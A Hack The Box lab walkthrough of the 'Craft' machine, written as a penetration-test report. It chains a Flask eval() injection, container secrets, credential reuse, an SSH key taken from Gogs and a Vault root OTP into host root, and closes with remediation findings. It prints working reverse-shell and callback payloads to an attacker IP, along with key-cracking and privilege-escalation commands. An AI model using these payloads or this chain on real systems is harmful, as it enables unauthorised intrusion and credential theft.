---
title: 'HTB Craft: Complete Evidence-Led Walkthrough'
description: A source-assisted Flask API injection leading through container secrets, credential reuse, Gogs, SSH and a Vault SSH OTP role to host root.
date: 2026-11-12
category: Linux / Web Security
difficulty: Not recorded
tags:
- Hack The Box
- Linux
- Flask
- Python Injection
- Docker
- Credential Reuse
- Vault
published: true
slug: htb-craft
---

# Overview

**Machine:** Craft  
**Platform:** Hack The Box  
**Publication format:** htb-craft.md  

Craft demonstrates why container compromise should be treated as an entry point for broader application and infrastructure enumeration, rather than equated with control of the host.

**Documentation standard:** All meaningful stages, verification results, failed leads, command sequences, and operator notes from the uploaded source are retained below. A redacted placeholder means the method was documented but its secret value is intentionally excluded. Reported results and absent terminal evidence remain explicitly qualified.

### Engagement context from the original record

**Target:** Craft (`10.129.229.45`)\
**Completion date:** 27 October 2026\
**Result:** User access as `gilfoyle` and host root access confirmed.\
**User flag:** `[REDACTED]``\
**Root flag:** `[REDACTED]`
transcript; record it from the root session.

> ## Mandatory operating rule: REUSE CREDS EVERYTIME WE CAN
>
> Every recovered password, hash, key, or token must go into a
> credential ledger and be tested against every relevant in-scope
> service/account where technically plausible. Record successes and
> failures. A failure may mean the service does not support that
> authentication method---not necessarily that the credential is wrong.

### Executive summary

Craft was compromised through a chain spanning an exposed Flask API,
Python expression injection, root access inside a Docker container,
database credential recovery, credential reuse against Gogs, SSH access
as `gilfoyle`, and a Vault root-policy token that enabled root SSH
access.

The API's ABV validation inserted untrusted JSON input into Python
`eval()`. A valid API account was used to obtain a JWT. A Python socket
callback confirmed code execution, and a reverse shell yielded root
inside the API container. Runtime settings exposed MySQL credentials and
the application signing secret. MySQL contained three application users
with plaintext passwords.

The recovered `gilfoyle` password worked for Gogs. Gilfoyle's
`craft-infra` repository contained an encrypted SSH private key and
Vault configuration. After unlocking the key, SSH to the host as
`gilfoyle` succeeded. On the host, the Vault CLI used an existing token
whose policy was `root`. Vault's SSH secrets engine had a `root_otp`
role; generating an OTP for `127.0.0.1` and using it with local SSH
yielded host root.

#### Attack chain

1.  Enumerate TCP services and web virtual hosts.
2.  Inspect the API and Gogs-linked source code.
3.  Identify `eval('%s > 1' % request.json['abv'])`.
4.  Authenticate to the API as `dinesh`, acquire a JWT, and exploit the
    injection.
5.  Confirm outbound execution and obtain root inside the API container.
6.  Read runtime settings and enumerate MySQL users.
7.  **Reuse credentials:** log in to Gogs as `gilfoyle`.
8.  Retrieve `gilfoyle/craft-infra`, unlock its SSH key, and SSH to the
    host.
9.  Discover the existing root-policy Vault token and SSH secrets
    engine.
10. Generate a root OTP and SSH to `root@127.0.0.1`.

## Enumeration

This section documents the initial conditions, observable services, reachable applications and evidence that informed the next action.

### Scope and initial enumeration

Item                      Result
  ------------------------- ------------------------------
  Target                    `10.129.229.45`
  Hostname                  `craft.htb`
  Web/API hosts             `craft.htb`, `api.craft.htb`
  Git host                  `gogs.craft.htb`
  Vault host                `vault.craft.htb`
  Callback source address   `10.10.14.254`
  Open TCP ports            22, 443, 6022

A full TCP scan found: - **22/tcp:** OpenSSH `7.4p1 Debian 10+deb9u6` -
**443/tcp:** nginx `1.15.8`, HTTPS title `About` - **6022/tcp:** Go
`x/crypto/ssh` server

The targeted scan was:

``` bash
sudo nmap -Pn -n -sC -sV -p22,443,6022 \
  --reason -oA ~/Craft/scans/tcp-targeted \
  10.129.229.45
```

The TLS certificate named `craft.htb`. The home page linked to
`https://api.craft.htb/api/` and `https://gogs.craft.htb/`, making the
API and Git service obvious next targets.

The public brew API returned paginated beer data. An unauthenticated
login request returned `401 UNAUTHORIZED` with
`WWW-Authenticate: Basic realm="Craft API Login"`.

## Analysis

The ABV validation code interpolated attacker-controlled JSON into eval(). API authentication made the injection reachable. Root inside Docker exposed runtime secrets and MySQL credential material; those identities were checked against Gogs, where infrastructure-as-code artifacts yielded host SSH access. The host had a Vault token with a root policy and an SSH OTP role, enabling the final elevation.

### API source review

The Gogs API repository was inspected locally:

``` bash
cd ~/Craft/loot/craft-api
find . -type f -not -path './.git/*' | sort
git log --oneline --decorate --all
git branch -a
git tag -l
```

Relevant commits included:

``` text
e55e12d Add db connection test script
a2d28ed Cleanup test
10e3ba4 add test script
c414b16 Add fix for bogus ABV values
4fd8dbf Add authentication to brew modify endpoints
90fb3e8 Initialize git project
```

In `craft_api/api/brew/endpoints/brew.py`, the authenticated POST
handler used:

``` python
if eval('%s > 1' % request.json['abv']):
    return "ABV must be a decimal value less than 1.0", 400
else:
    create_brew(request.json)
    return None, 201
```

This is Python expression injection / RCE: attacker-controlled `abv`
content is concatenated into a Python expression and evaluated. The
authentication code issued a JWT after comparing the submitted
username/password with the database and expected subsequent requests to
use `X-Craft-Api-Token`.

The API token was obtained with the recovered `dinesh` credentials:

``` bash
TOKEN=$(curl -sk \
  -u 'dinesh:[REDACTED]' \
  https://api.craft.htb/api/auth/login |
  python3 -c 'import json,sys; print(json.load(sys.stdin)["token"])')
```

Token validity was confirmed:

``` bash
curl -sk -i \
  -H "X-Craft-Api-Token: $TOKEN" \
  https://api.craft.htb/api/auth/check
```

The endpoint returned `{"message":"Token is valid!"}`.

## Validation

The following is the full technical sequence retained from the uploaded write-up, including commands, outputs, dead ends, corrected tests and the limits of available proof. Section order within this part follows the original investigation.

### Exploitation and callback troubleshooting

#### Initial payload

The initial payload was saved in `/tmp/craft-payload.json`:

``` json
{
  "abv": "__import__('os').system('bash -c \"bash -i >& /dev/tcp/10.10.14.254/4444 0>&1\"') or 2",
  "name": "Validation test",
  "brewer": "Craft",
  "style": "Test"
}
```

It was sent with:

``` bash
curl -sk -i -X POST \
  https://api.craft.htb/api/brew/ \
  -H "X-Craft-Api-Token: $TOKEN" \
  -H 'Content-Type: application/json' \
  --data-binary @/tmp/craft-payload.json
```

The API returned `400 BAD REQUEST` with
`ABV must be a decimal value less than 1.0`.

**This 400 was not proof that execution failed.** The vulnerable code
returns 400 when the evaluated expression is truthy. The injected
expression intentionally ended with `or 2`, so the validation condition
could remain true even when the injected command ran.

A listener was also started after one request had already been sent.
That attempt could not establish a callback because no listener was
waiting at trigger time. Start listeners first.

#### Marker test

A shell-based marker attempt did not produce a callback. Instead of
assuming the RCE hypothesis was wrong, execution was tested separately
from shell behavior.

The successful diagnostic expression was:

``` python
payload = (
    "__import__('socket').create_connection("
    "('10.10.14.254',8000)).send(b'RCE-CHECK') or 2"
)
```

It was serialized into `/tmp/craft-check.json` and sent using the same
authenticated POST request. With `nc -lvnp 8000` already running, the
listener received:

``` text
Connection received on 10.129.229.45 48602
RCE-CHECK
```

This confirmed Python expression execution and outbound connectivity.

#### Interactive shell

The first Python PTY payload connected and then disconnected. The
callback path was functional, but the interactive process/I/O handling
was not stable.

The working payload used `subprocess` with the socket attached to the
shell's standard streams:

``` python
payload = (
    "exec(\"import socket,subprocess;"
    "s=socket.socket();"
    "s.connect(('10.10.14.254',4444));"
    "subprocess.call(['/bin/sh','-i'],"
    "stdin=s,stdout=s,stderr=s)\") or 2"
)
```

It was saved in `/tmp/craft-shell.json`. The listener was started first:

``` bash
nc -lvnp 4444
```

Then a fresh token was acquired and the JSON was submitted to
`POST /api/brew/`. An interactive shell was obtained as root inside the
API container.

#### Key troubleshooting lessons

-   HTTP status alone did not prove or disprove RCE.
-   Start the listener before triggering the callback.
-   Prove execution with a small marker before debugging an interactive
    shell.
-   Separate a network callback failure from quoting, shell
    availability, and process I/O problems.

### Container post-exploitation

The shell was root inside Docker, not yet host root. Evidence included
`/.dockerenv`, `/proc/1/cgroup` paths under `/docker/5a3d2431...`,
hostname/container ID prefix `5a3d243127f5`, and IP `172.20.0.6/16` with
default gateway `172.20.0.1`.

The container's `/opt/app` was a read-write bind mount backed by host
path `/opt/storage/craft-api`. The Docker socket was absent inside this
container:

``` text
/var/run/docker.sock: No such file or directory
```

This ruled out the simplest Docker-socket path from the API container.
The bind mount was noteworthy but did not itself prove host root.

### Runtime settings and MySQL

The runtime settings file was found at:

``` bash
cat /opt/app/craft_api/settings.py
```

Relevant configuration:

``` python
CRAFT_API_SECRET = '<REDACTED>'

MYSQL_DATABASE_USER = 'craft'
MYSQL_DATABASE_PASSWORD = '<REDACTED>'
MYSQL_DATABASE_DB = 'craft'
MYSQL_DATABASE_HOST = 'db'
```

The `craft` database contained tables `brew` and `user`. The `user`
schema had `id`, `username`, and `password`; the recovered records were:

    ID Username     Password
  ---- ------------ ------------------
     1 `dinesh`     `[REDACTED]`
     4 `ebachman`   `[REDACTED]`
     5 `gilfoyle`   `[REDACTED]`

These passwords were stored in plaintext. Runtime settings also exposed
the MySQL password and JWT signing secret.

### Credential reuse ledger

> # REUSE CREDS EVERYTIME WE CAN

  ------------------------------------------------------------------------------------------
  Recovered          Service tested    Result            Interpretation
  credential                                             
  ------------------ ----------------- ----------------- -----------------------------------
  `dinesh` /         API Basic         **Success**       JWT obtained
  `[REDACTED]`   authentication                      

  `gilfoyle` /       Gogs web login    **Success**       Accessed infrastructure repository
  `[REDACTED]`                                       

  `gilfoyle`         SSH port 22       No shell access   Server offered
  password                                               `publickey,keyboard-interactive`;
                                                         password auth was not offered

  `gilfoyle`         SSH port 6022     No password auth  After host-key negotiation, service
  password                                               offered only `publickey`

  Gilfoyle private   SSH port 22       **Success**       Host shell as `gilfoyle`
  key                                                    

  Existing Vault CLI Vault CLI/API     **Success**       Token policy was `root`; could
  token                                                  generate root SSH OTP
  ------------------------------------------------------------------------------------------

Credential reuse must be systematic, but authentication method matters.
A password rejected by a public-key-only SSH service is not proof that
the password is wrong for other services.

### Gogs infrastructure repository and SSH key

Gogs accepted the recovered Gilfoyle password. The
`gilfoyle/craft-infra` repository contained:

``` text
.ssh/id_rsa
.ssh/id_rsa.pub
mysql/craft.sql
vault/config.hcl
vault/Dockerfile
vault/secrets.sh
docker-compose.yml
nginx/...
```

The public key comment was `gilfoyle@craft.htb`. The encrypted private
key was successfully unlocked later; `ssh-keygen -y -f .ssh/id_rsa`
emitted the matching public key.

An initial SSH-to-John attempt used the wrong path:

``` bash
ssh2john ssh/id_rsa > /tmp/gilfoyle-key.hash
```

John returned `No password hashes loaded`. The key was actually under
the hidden `.ssh/` directory. The corrected extraction was:

``` bash
python3 /usr/share/john/ssh2john.py .ssh/id_rsa \
  > /tmp/gilfoyle-key.hash
```

The hash began with `$sshng$6`; John identified a bcrypt/AES SSH
private-key format and an iteration count of 16. The observed guessing
rate was approximately 75--83 guesses per second. Hashcat support was
investigated, but no successful Hashcat recovery is recorded in the
transcript. The exact key passphrase used was not unambiguously
captured, so this report does not attribute the eventual unlock to a
particular cracking tool.

Host SSH access succeeded:

``` bash
ssh -i .ssh/id_rsa \
  -o IdentitiesOnly=yes \
  gilfoyle@10.129.229.45
```

The host reported `uid=1001(gilfoyle)` and hostname `craft.htb`. The
user flag was read from `~/user.txt`:

``` text
[REDACTED_HEX]
```

### Vault discovery and root escalation

#### Vault service

On the host, these commands revealed Vault:

``` bash
ps auxww | grep -i '[v]ault'
env | grep -i vault
command -v vault
```

Observed:

``` text
VAULT_ADDR=https://vault.craft.htb:8200/
```

The Vault CLI was `/usr/local/bin/vault`. Vault's configuration from
`craft-infra` was:

``` hcl
storage "file" {
  path = "/vault/data"
}
ui = false
listener "tcp" {
  address = "0.0.0.0:8200"
  tls_cert_file = "/vault/pki/vault.craft.htb.crt"
  tls_key_file = "/vault/pki/vault.craft.htb.key"
  tls_min_version = "tls12"
}
```

The Docker Compose service mounted Vault config, PKI, logs, and data
from host storage and set `privileged: true`. Gilfoyle could not read
`/opt/storage/vault` directly because `/opt/storage` was root-only.

The health API reported Vault 0.11.1 initialized and unsealed. One
inconsistency was observed: `vault status` printed `Initialized false`,
while `/v1/sys/health` and `/v1/sys/seal-status` reported initialized
and unsealed. This did not prevent token lookup or OTP generation.

#### Existing root-policy token

The following command succeeded:

``` bash
vault token lookup
```

It showed:

``` text
policies [root]
```

A token file existed at `/home/gilfoyle/.vault-token`. The token value
is not reproduced here.

`vault auth list` showed `token/` and `userpass/`. `vault secrets list`
showed an enabled `ssh/` engine.

The infrastructure repository's `vault/secrets.sh` configured:

``` bash
vault secrets enable ssh

vault write ssh/roles/root_otp \
    key_type=otp \
    default_user=root \
    cidr_list=0.0.0.0/0
```

#### Generate OTP and obtain root

The following request succeeded:

``` bash
vault write ssh/creds/root_otp ip=127.0.0.1
```

Vault returned `key_type=otp`, `port=22`, `username=root`, and a
one-time value in the `key` field. The ephemeral OTP is intentionally
redacted from this report.

From the Gilfoyle session:

``` bash
ssh root@127.0.0.1
```

The returned OTP was entered at the password prompt. The user confirmed
root access. The root flag retrieval command was:

``` bash
cat /root/root.txt
```

The root flag value was not included in the supplied transcript.

### Failed attempts and corrections

------------------------------------------------------------------------------------------------------
  Attempt                 Result                                                 Lesson
  ----------------------- ------------------------------------------------------ -----------------------
  Empty API credentials   `401 UNAUTHORIZED`                                     Valid API credentials
                                                                                 were needed

  Initial injected        HTTP 400                                               Expected validation
  request                                                                        branch; not proof of
                                                                                 failed execution

  Listener started after  No callback                                            Start listener first
  request                                                                        

  Shell-based marker      No callback                                            Test execution
  payload                                                                        independently of shell
                                                                                 quoting

  Python socket marker    `RCE-CHECK` received                                   RCE confirmed

  First PTY shell         Connected then disconnected                            Callback worked; shell
                                                                                 I/O needed adjustment

  Gilfoyle password on    `Permission denied (publickey,keyboard-interactive)`   Password auth was not
  SSH 22                                                                         offered

  Port 6022 default       No matching host-key type                              Service offered legacy
  negotiation                                                                    `ssh-rsa`

  Port 6022 after         `Permission denied (publickey)`                        Service accepted public
  host-key override                                                              keys only

  Wrong `ssh2john` path   No hashes loaded                                       Correct path was
                                                                                 `.ssh/id_rsa`

  Vault files from        File not found                                         Repository files were
  Gilfoyle home                                                                  on Parrot

  Container Docker socket Absent                                                 No direct socket path
                                                                                 from API container

  `/opt/storage/vault` as Permission denied                                      Continue through Vault
  Gilfoyle                                                                       CLI/token, not
                                                                                 filesystem access
  ------------------------------------------------------------------------------------------------------

## Impact

The source documents authenticated API exploitation, container root, host access as gilfoyle and host-root access through Vault SSH OTP. The root flag value was not retained.

### Evidence inventory

Artifacts observed or created during the engagement:

-   `~/Craft/scans/tcp-all` --- full TCP scan (original invocation was
    truncated in the transcript).
-   `~/Craft/scans/tcp-targeted` --- targeted Nmap output.
-   `~/Craft/evidence/https-headers.txt` --- HTTPS headers.
-   `~/Craft/evidence/https-root.html` --- home page source.
-   `~/Craft/loot/craft-api/` --- API repository.
-   `~/Craft/loot/craft-infra/` --- infrastructure repository.
-   `/tmp/craft-payload.json` --- initial reverse-shell payload.
-   `/tmp/craft-check.json` --- callback marker payload.
-   `/tmp/craft-shell.json` --- interactive shell payload.
-   `/tmp/gilfoyle-key.hash` --- SSH private-key hash.
-   `/home/gilfoyle/.vault-token` --- Vault token helper file observed
    on the target.

Do not include reusable passwords, private keys, JWTs, Vault tokens, or
OTPs in a public report. The credential values above are retained for
the original private lab record; recovered values are masked in this edition.

### Final status

Milestone                              Status
  -------------------------------------- ----------------------------
  TCP and virtual-host enumeration       Complete
  API source review                      Complete
  Python expression injection            Confirmed
  Root inside API container              Confirmed
  Runtime config and MySQL enumeration   Complete
  Credential reuse against Gogs          Successful
  Host SSH as Gilfoyle                   Successful
  User flag                              Captured
  Vault root-policy token                Confirmed
  Root OTP generation                    Successful
  Host root                              Confirmed
  Root flag value                        Not included in transcript

**Final result:** Craft was fully compromised from the public API to
host root. The key chain was Python expression injection, credential
reuse, the infrastructure repository/private key, and a root-policy
Vault token.

## Remediation

The defensive recommendations and operational lessons below address the demonstrated weaknesses. They follow the original source material instead of inferring additional compromise.

### Findings and remediation

#### Finding 1 --- Python `eval()` injection in the API

**Severity:** Critical\
**CWE:** CWE-95

**Impact:** Authenticated arbitrary Python expression execution in the
API process, leading to root inside the API container and access to
runtime configuration and database credentials.

**Remediation:** - Remove `eval()` from validation. - Enforce a strict
schema requiring a numeric ABV value. - Validate a numeric range without
evaluating user-controlled text. - Add regression tests for strings,
operators, quotes, and malformed JSON types. - Review the codebase for
other dynamic evaluation or command construction.

#### Finding 2 --- Plaintext application passwords and runtime secrets

**Severity:** High\
**CWE:** CWE-256, CWE-522

**Impact:** Database users were stored with plaintext passwords; runtime
configuration exposed the MySQL password and JWT secret.

**Remediation:** - Store passwords as Argon2id/bcrypt hashes. - Rotate
exposed application passwords and the JWT signing secret. - Store
deployment secrets in a managed secret store. - Use a least-privilege DB
account. - Scan current files and Git history for secrets.

#### Finding 3 --- SSH private key in Gogs

**Severity:** High\
**CWE:** CWE-522

**Impact:** A repository-accessible private key enabled SSH access as
Gilfoyle after it was unlocked.

**Remediation:** - Remove the key from the repository and rotate the
corresponding public key. - Treat committed private keys as compromised,
even if encrypted. - Use secret management and repository secret
scanning. - Review commit history and rotate exposed credentials.

#### Finding 4 --- Root-policy Vault token accessible to Gilfoyle

**Severity:** Critical\
**CWE:** CWE-269, CWE-732

**Impact:** Gilfoyle's Vault CLI used a root-policy token to generate a
root SSH OTP, enabling host root access.

**Remediation:** - Revoke the exposed root token and audit its usage. -
Never place root-policy tokens in interactive users' token helpers. -
Apply least-privilege Vault policies and short-lived credentials. -
Protect token files and monitor Vault audit logs. - Restrict the root
OTP role's CIDR list and access. - Upgrade the end-of-life Vault 0.11.1
deployment.

#### Finding 5 --- Privileged Vault container

**Severity:** High\
**CWE:** CWE-250

**Impact:** `docker-compose.yml` configured Vault with
`privileged: true`, weakening container isolation.

**Remediation:** - Remove privileged mode. - Run as a dedicated non-root
user with minimal capabilities. - Apply seccomp/AppArmor and a read-only
filesystem where practical. - Minimize writable host mounts and isolate
service networks. - Keep container images and runtime components
patched.

#### Finding 6 --- Legacy SSH host-key algorithm on port 6022

**Severity:** Low/Medium

**Evidence:** The Go SSH service offered `ssh-rsa` as its host-key
algorithm and only public-key authentication.

**Remediation:** Upgrade the service/library and prefer current host-key
and key-exchange algorithms.

### CPTS lessons

1.  **REUSE CREDS EVERYTIME WE CAN.** Test every recovered credential
    against relevant in-scope services and record the outcome.
2.  Source code review can turn a vague web target into a specific
    exploit hypothesis.
3.  HTTP error codes are not reliable proof of exploit success when they
    reflect application logic; use observable evidence.
4.  Start listeners before triggering callbacks.
5.  Confirm code execution with a small marker before troubleshooting
    interactive shells.
6.  Container root and host root are different security boundaries.
7.  Inspect runtime settings after application compromise, especially
    ignored or deployment-only configuration.
8.  Enumerate database user tables for reuse opportunities.
9.  Treat infrastructure repositories as sensitive; they can expose
    private keys and privilege-escalation configuration.
10. Interpret SSH authentication errors accurately: a password rejected
    because password auth is not offered is not evidence that the
    password is invalid everywhere.
11. Inspect installed CLIs and default credential helpers on a host.
12. Follow the chain across trust boundaries: API → container →
    credentials → Gogs → host user → Vault → host root.
